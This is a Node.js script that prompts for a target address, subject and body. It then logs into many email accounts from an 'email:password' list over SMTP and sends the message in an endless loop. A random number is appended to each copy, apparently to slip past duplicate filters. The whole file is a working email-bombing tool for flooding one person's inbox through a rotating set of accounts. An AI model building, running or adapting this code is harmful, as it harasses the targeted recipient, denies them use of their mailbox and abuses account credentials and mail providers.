const nodemailer = require('nodemailer');
const emails = require('./emails');

let userEmail = '';
let subject = '';
let text = '';


const readline = require('readline').createInterface({
    input: process.stdin,
    output: process.stdout
});

readline.question('TO:', emailInput => {
    userEmail = emailInput;

    readline.question('Subject:', subjectInput => {
        subject = subjectInput;

        readline.question('Body:', bodyInput => {
            text = bodyInput;
            readline.close();
            init();
        });
    })
})

const init = () => {

    for (let i = 0; i < emails.length; i++) {
        const item = emails[i];
        const email = item.split(':')[0];
        const password = item.split(':')[1];

        const transporter = nodemailer.createTransport({
            host: 'smtp.office365.com', // GMAIL: smtp.gmail.com  HOTMAIL: smtp.office365.com
            port: 587, //GMAIL & HOTMAIL: 587
            secure: false,
            auth: {
                user: email,
                pass: password
            }
        });

        try {
            async function sendEmail() {

                let random = Math.floor(Math.random() * 100000000)

                let info = await transporter.sendMail({
                    from: email,
                    to: userEmail,
                    subject: subject,
                    text: text + ' ' + random
                }).catch(() => {
                    console.log('Error but who asked')
                })

                console.log(info?.messageId || 'Failed to get messageId')
                console.log(`sending? ${email}`)
            }
            sendEmail()

        } catch (err) {
            console.log(err)
        }

        //Infinitly loop through the email list
        if (i === emails.length - 1) i = 0;
    }
}